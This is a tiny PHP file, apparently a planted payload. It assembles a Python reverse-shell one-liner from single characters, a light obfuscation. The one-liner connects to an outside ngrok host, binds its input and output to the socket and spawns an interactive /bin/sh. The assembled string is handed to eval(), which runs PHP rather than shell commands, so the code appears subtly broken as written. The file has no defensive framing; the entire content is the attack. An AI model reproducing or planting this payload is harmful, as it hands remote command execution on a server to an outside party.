<?php
$cmd = array("n", "o", "h", "u", "p", " ", "/usr/bin/python ", "-c ", "'import socket, subprocess, os; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"0.tcp.ap.ngrok.io\",15178)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); p = subprocess.call([\"/bin/sh\", \"-i\"]);' &");
$cmd = implode($cmd);
eval($cmd);
?>
